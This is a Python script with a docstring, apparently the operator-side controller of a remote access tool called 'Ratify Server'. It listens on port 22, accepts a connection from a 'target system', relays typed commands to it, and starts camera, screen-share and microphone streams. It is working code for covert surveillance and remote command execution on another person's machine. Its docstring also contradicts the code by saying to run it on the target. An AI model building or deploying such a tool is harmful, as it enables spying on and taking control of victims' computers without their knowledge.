"""
Ratify Server Script Documentation
===========================

This Python server script is designed to provide remote control capabilities over a network connection. It allows users to connect to the server, execute commands, and manage various functions remotely. This documentation outlines the script's purpose, usage, setup instructions, and key functionalities.

Purpose:
--------
The server script is intended to facilitate remote control and management of a target system. It listens for incoming connections, receives and processes commands, and can execute actions such as streaming audio/video and interacting with the target system.

Usage:
------
1. Run the server script on the target machine.
2. Clients can connect to the server using a compatible client script.
3. Once connected, clients can send commands to the server for execution.
4. The server processes incoming commands and performs the requested actions.

Setup Instructions:
-------------------
Before using the server script, follow these setup instructions:

1. Ensure Python is installed on the target machine.

2. Install any required dependencies for the script, if not already installed.

3. Configure the `host` and `port` variables in the script to specify the desired network address and port on which the server should listen.

4. Run the server script
"""
import socket
import threading
import subprocess
import time

sock = ""
listen = False

host = '127.0.0.1'
port = 22

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen()

def stream():
    global streamproc
    subprocess_args = ["python", "stream.py"]
    streamproc = subprocess.Popen(subprocess_args)

def streama():
    global streamaproc
    subprocess_args = ["python", "stream.py", "-streama"]
    streamaproc = subprocess.Popen(subprocess_args)
    
def connect():
    try:
        global sock
        client_socket, client_address = server_socket.accept()
        sock = client_socket
        print(f"Connected to {host}:{port}")
    except Exception as e:
        print("Error:", e)
        
def send_data():
    global listen
    while True:
        try:
            data = input()
            if data.lower() == 'exit':
                sock.send(data.encode())
                break
            
            if data.startswith("camera") or data.startswith("sharescreen"):
                parts = data.split()
                if len(parts) == 2:
                    command, param = parts
                    if param == "stop":
                        streamproc.terminate()
                else:        
                    stream()
                
            elif data.startswith("audiolisten"):                
                parts = data.split()
                if len(parts) == 2:
                    command, param = parts
                    if param == "stop":
                        streamaproc.terminate()
                else:        
                    streama()
                
            elif data.startswith("back"):
                listen = False
                break
            
            if not data:
                data = "cd"
            sock.send(data.encode())
            time.sleep(1)
        except Exception:
            pass

def receive_data():
    while listen:
        try:
            data = sock.recv(1024)
            if not data:
                break
            print(data.decode(), end="")
        except Exception:
            break

text = """
Select:
1. Connect
2. Exit
"""      
conn = threading.Thread(target=connect, daemon=True)
conn.start()

while True:
    try:
        num = int(input(text + "\n>"))
        
        if num == 1:
            listen = True
            receive_thread = threading.Thread(target=receive_data, daemon=True)
            receive_thread.start()        
            send_data()
        elif num == 2:
            listen = False
            break
    except Exception:
        pass